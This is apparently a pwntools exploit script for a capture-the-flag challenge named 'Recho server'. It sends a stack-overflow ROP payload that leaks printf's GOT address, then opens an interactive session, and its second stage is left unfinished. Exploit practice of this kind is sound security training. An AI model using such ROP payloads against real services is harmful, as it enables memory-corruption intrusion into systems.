from pwn import *
import tty

context.os = 'linux'
context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']

#libc = ELF('/home/sev1n/tools/glibc-all-in-one/libs/2.31-0ubuntu9_amd64/libc.so.6')
#libc = ELF('./')
elf = ELF('./pwn')

context.log_level = 'debug'
debug = 1

if debug:
    io = process('./pwn',stdin=PTY)
else:
    io = remote('')

def p():
    gdb.attach(proc.pidof(io)[0])

#one_gadget = [,,]
pop_rdi_ret = 0x00000000004008a3 # pop rdi ; ret

io.sendlineafter(b'Welcome to Recho server!\n',str(200).encode())
puts_got = elf.got['printf']
puts_plt = elf.plt['printf']
ret_addr = 0x4007A3
payload = b'a' * 0x38 + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(ret_addr) 
#payload = b'a'*0x38
#payload = b'\n'
io.send(payload)
#p()
io.send(chr(tty.CEOF))
io.clean()
#io.send(str(200).encode())


io.interactive()

